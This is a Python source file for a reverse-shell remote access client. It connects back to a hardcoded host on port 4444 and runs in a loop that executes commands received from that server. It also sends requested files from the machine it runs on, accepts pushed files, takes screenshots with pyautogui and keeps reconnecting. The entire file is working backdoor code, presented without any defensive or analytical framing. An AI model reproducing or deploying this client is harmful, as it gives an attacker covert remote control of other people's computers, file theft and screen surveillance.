import socket
import os
import subprocess
from time import sleep
import pyautogui

class client:

    client_socket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server_ip=""
    server_port=""
    def __init__(self,server_ip,server_port):
        self.server_ip=server_ip
        self.server_port=server_port



    def client_upload (self,path_input):
        if os.path.exists(path_input):
            chunk="Yes".encode()
            self.client_socket.send(chunk)
            with open(path_input,"rb") as file:
                file_data=file.read()
                self.client_socket.sendall(file_data)
                chunk="ENDOFMESSAGE".encode()
                self.client_socket.send(chunk)
                file.close()
                

    def client_download(self,file_name):
        response = self.client_socket.recv(2048)
        total_response=""
        if response.decode().startswith("Yes"):
            response=response.decode().replace("Yes","")
            total_response+=response
            print("Downloading file...\n")
            if total_response.endswith("ENDOFMESSAGE"):
                total_response=total_response.replace("ENDOFMESSAGE", "")       
                exit
            else:
                while True:
                    response = self.client_socket.recv(2048)
                    total_response+=response.decode()
                    if total_response.endswith("ENDOFMESSAGE"):
                        total_response=total_response.replace("ENDOFMESSAGE", "")       
                        break

            with open(file_name,"xb") as file:
                file.write(total_response.encode())
                print("File downloaded successfully.\n")
                file.close()

        else:
            response = "No!"
            self.client_socket.send(response.encode())
            exit


    def client_connector(self):
        try:
            self.client_socket.connect((self.server_ip,int(self.server_port)))
            print("Client connected successfully\n")
            while True:
                command=self.client_socket.recv(2048)
                command_string = command.decode()
                if command_string.startswith("cd"):
                    path_input=command_string.strip("cd ")

                    if os.path.exists(path_input):
                        os.chdir(path_input)
                        continue
                    else:
                        print("Path does not exist!\n")
                        continue

                if command_string.startswith("download"):
                    path_input=command_string.strip("download ")
                    self.client_upload(path_input)
                    continue

                if command_string.startswith("upload"):
                    file_path = command_string.strip("upload ")
                    file_name_with_ext = os.path.basename(file_path)
                    if not os.path.exists("./Uploads"):
                        os.makedirs("./Uploads")
                    file_name="./Uploads/"+file_name_with_ext
                    while os.path.exists(file_name):
                        file_name+="(1)"
                    self.client_download(file_name)
                    continue

                elif command_string=="screenshot":
                    if not os.path.exists("./Screenshots"):
                        os.makedirs("./Screenshots")
                    x=0
                    file_name=""
                    file_name = os.path.join("./Screenshots/", f"{x}.png")
                    screenshot = pyautogui.screenshot()
                    while os.path.exists(file_name):
                        x+=1
                        file_name = os.path.join("./Screenshots/", f"{x}.png")
                    screenshot.save(file_name)
                    print("Screenshot saved at:{}".format(file_name))
                    continue
                    
                    
                response = subprocess.run([command],shell=False,capture_output=True)
                if response.stderr.decode() == "":
                    response_byte = response.stdout
                else:
                    response_byte=response.stderr
                response_byte= response_byte.decode()+"ENDOFMESSAGE"
                self.client_socket.sendall(response_byte.encode())
                
        except ConnectionRefusedError: 
             print(f"Connection refused. Make sure the server is running at {self.server_ip}:{self.server_port}")
        except socket.gaierror:
            print(f"Address resolution error. Could not resolve {self.server_ip}.")
        except Exception as e: print(f"Exception occurred: {e}")

        finally:
            print("Client connection closed.")
            if self.client_socket and not self.client_socket._closed:
                self.client_socket.close()
                



if __name__=="__main__":
    new_client = client("172.16.181.132","4444")
    new_client.client_connector()
    while True:
        try:
            new_client.client_connector()
        except KeyboardInterrupt:
            print("\nClient shutting down.")
            break
        sleep(2)